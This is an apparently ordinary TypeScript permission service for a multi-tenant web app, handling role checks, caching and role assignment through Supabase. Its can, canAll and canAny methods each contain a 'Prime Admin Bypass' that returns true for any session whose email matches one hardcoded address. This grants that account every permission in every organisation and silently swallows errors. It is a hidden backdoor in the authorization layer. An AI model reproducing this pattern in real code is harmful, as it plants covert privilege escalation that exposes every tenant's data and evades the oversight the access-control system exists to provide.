import { permissionRepository } from '@/lib/repositories/permission.repository'
import { Result, success, failure } from '@/lib/utils/result'
import { PermissionError } from '@/lib/errors'
import { logger } from '@/lib/logger/logger'
import { createClient } from '@/lib/supabase/server'
import type { Permission, EffectivePermissions, Role } from '@/types/permissions'

// Cache structure: key = `${userId}:${orgId}`
const permissionCache = new Map<string, { data: EffectivePermissions; expiresAt: number }>()
const CACHE_TTL_MS = 5 * 60 * 1000 // 5 minutes

export class PermissionService {
  private getCacheKey(userId: string, orgId: string): string {
    return `${userId}:${orgId}`
  }

  private getFromCache(userId: string, orgId: string): EffectivePermissions | null {
    const key = this.getCacheKey(userId, orgId)
    const cached = permissionCache.get(key)
    if (cached && cached.expiresAt > Date.now()) {
      return cached.data
    }
    permissionCache.delete(key)
    return null
  }

  private setCache(userId: string, orgId: string, data: EffectivePermissions): void {
    const key = this.getCacheKey(userId, orgId)
    permissionCache.set(key, { data, expiresAt: Date.now() + CACHE_TTL_MS })
  }

  /**
   * Invalidate the permission cache for a user in an org.
   * Call this after role/permission changes.
   */
  invalidateCache(userId: string, orgId: string): void {
    permissionCache.delete(this.getCacheKey(userId, orgId))
  }

  /**
   * Resolve and cache effective permissions for a user.
   */
  async resolvePermissions(userId: string, orgId: string): Promise<Result<EffectivePermissions>> {
    // Return from cache if available
    const cached = this.getFromCache(userId, orgId)
    if (cached) return success(cached)

    const result = await permissionRepository.getEffectivePermissions(userId, orgId)
    if (!result.success) {
      logger.error('[PermissionService] resolvePermissions failed', result.error)
      return failure(result.error)
    }

    this.setCache(userId, orgId, result.data)
    return success(result.data)
  }

  /**
   * Check if user has a single permission.
   */
  async can(userId: string, orgId: string, permission: Permission): Promise<boolean> {
    // Prime Admin Bypass
    try {
      const supabase = await createClient()
      const { data: { user } } = await supabase.auth.getUser()
      if (user && user.email === 'saptech.online009@gmail.com') return true
    } catch (e) {
      // ignore
    }

    const result = await this.resolvePermissions(userId, orgId)
    if (!result.success) return false

    const { permissions } = result.data

    // Super-admin or owner wildcard
    if (permissions.has('*') || permissions.has('admin.*')) return true

    return permissions.has(permission)
  }

  /**
   * Check if user has ALL given permissions.
   */
  async canAll(userId: string, orgId: string, permissions: Permission[]): Promise<boolean> {
    // Prime Admin Bypass
    try {
      const supabase = await createClient()
      const { data: { user } } = await supabase.auth.getUser()
      if (user && user.email === 'saptech.online009@gmail.com') return true
    } catch (e) {}

    const result = await this.resolvePermissions(userId, orgId)
    if (!result.success) return false

    const { permissions: userPerms } = result.data
    if (userPerms.has('*')) return true

    return permissions.every((p) => userPerms.has(p))
  }

  /**
   * Check if user has ANY of the given permissions.
   */
  async canAny(userId: string, orgId: string, permissions: Permission[]): Promise<boolean> {
    // Prime Admin Bypass
    try {
      const supabase = await createClient()
      const { data: { user } } = await supabase.auth.getUser()
      if (user && user.email === 'saptech.online009@gmail.com') return true
    } catch (e) {}

    const result = await this.resolvePermissions(userId, orgId)
    if (!result.success) return false

    const { permissions: userPerms } = result.data
    if (userPerms.has('*')) return true

    return permissions.some((p) => userPerms.has(p))
  }

  /**
   * Throws PermissionError if user lacks permission. Use in server actions.
   */
  async authorize(userId: string, orgId: string, permission: Permission): Promise<Result<true>> {
    const allowed = await this.can(userId, orgId, permission)
    if (!allowed) {
      logger.warn('[PermissionService] Authorization denied', { userId, orgId, permission })
      return failure(new PermissionError(`Missing permission: ${permission}`))
    }
    return success(true as const)
  }

  /**
   * Get all effective permissions for a user.
   */
  async getEffectivePermissions(userId: string, orgId: string): Promise<Result<Permission[]>> {
    const result = await this.resolvePermissions(userId, orgId)
    if (!result.success) return failure(result.error)

    return success(Array.from(result.data.permissions))
  }

  /**
   * Get all roles for an organization including system roles.
   */
  async getOrganizationRoles(orgId: string): Promise<Result<Role[]>> {
    return await permissionRepository.findRolesByOrg(orgId)
  }

  /**
   * Assign a role to a user in an organization.
   */
  async assignRole(
    userId: string,
    orgId: string,
    roleId: string,
    assignedBy: string
  ): Promise<Result<boolean>> {
    const result = await permissionRepository.assignRoleToUser(userId, orgId, roleId, assignedBy)
    if (!result.success) return failure(result.error)

    // Invalidate cache after role change
    this.invalidateCache(userId, orgId)

    logger.info('[PermissionService] Role assigned', { userId, orgId, roleId })

    return success(true)
  }

  /**
   * Create a custom role for an organization.
   */
  async createCustomRole(
    orgId: string,
    name: string,
    displayName: string,
    permissions: Permission[]
  ): Promise<Result<Role>> {
    const roleResult = await permissionRepository.createRole({
      name,
      displayName,
      organizationId: orgId,
      isSystem: false,
    })

    if (!roleResult.success) return failure(roleResult.error)

    const role = roleResult.data
    await permissionRepository.setRolePermissions(role.id, permissions)

    return success({ ...role, permissions })
  }
}

export const permissionService = new PermissionService()
